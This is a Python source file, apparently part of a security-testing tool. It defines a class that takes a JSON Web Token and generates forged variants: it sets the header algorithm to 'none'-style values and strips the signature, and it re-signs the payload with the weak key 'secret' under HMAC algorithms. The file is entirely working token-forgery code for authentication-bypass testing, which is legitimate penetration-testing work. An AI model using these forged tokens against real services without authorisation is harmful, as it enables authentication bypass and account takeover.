import base64
import json
import jwt
from parth_core.constants import (JWT_HMAC_NONE_ALGOS, JWT_HMAC_ALGOS)


class JWTGenerator:
    def __init__(self, token):
        self.__original_token = token
        self.__generated_tokens = []
        self.__header = ''
        self.__payload = ''
        self.__signature = ''

    def generate_jwt(self):
        self.__get_entities()
        self.__manipulate_hmac_algos()
        self.__generate_invalid_signature()
        print('Manipulated JWTs:')
        for jwt in self.__generated_tokens:
            print('--------------------------------')
            print(jwt)

    def __get_entities(self):
        entities = self.__original_token.split('.')
        self.__header = entities[0]
        self.__payload = entities[1]
        self.__signature = entities[2]

    def __manipulate_hmac_algos(self):
        self.__header += "=" * ((4 - len(self.__header) % 4) % 4)
        decoded_header = base64.urlsafe_b64decode(self.__header).decode()
        header = json.loads(decoded_header)
        for algo in JWT_HMAC_NONE_ALGOS:
            header['alg'] = algo
            json_header = json.dumps(header)
            encoded = base64.urlsafe_b64encode(json_header.encode())
            b64_header = encoded.decode().replace('\n', '').replace('=', '')
            jwt = b64_header + '.' + self.__payload + '.'
            self.__generated_tokens.append(jwt)

    def __generate_invalid_signature(self):
        self.__payload += "=" * ((4 - len(self.__payload) % 4) % 4)
        decoded_payload = base64.urlsafe_b64decode(self.__payload).decode()
        payload = json.loads(decoded_payload)
        for algo in JWT_HMAC_ALGOS:
            encoded_jwt = jwt.encode(payload=payload, key='secret', algorithm=algo).decode()
            self.__generated_tokens.append(encoded_jwt)

